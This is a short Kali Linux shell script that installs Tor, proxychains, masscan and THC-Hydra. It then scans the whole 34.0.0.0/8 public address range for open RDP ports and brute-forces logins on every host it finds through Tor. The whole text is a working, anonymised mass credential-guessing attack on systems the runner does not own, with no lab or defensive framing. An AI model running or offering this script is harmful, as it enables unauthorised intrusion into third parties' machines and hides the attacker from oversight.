# TESTED ON KALI LINUX
sudo apt update && sudo apt install tor proxychains build-essential freerdp2-dev cmake masscan libpcap-dev -y;
sudo pkill tor;
tor &
git clone https://github.com/vanhauser-thc/thc-hydra.git;
cd thc-hydra;
./configure && make -j8 && sudo make install;
cd ..;
sudo masscan --range 34.0.0.0-34.255.255.255 --rate 50000 -p3389 --open --banners -oG rdp.scan;
for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do proxychains hydra -vv rdp://$i -e ns -L user -P pass -t1 -W1 -I >hydra.log;
done
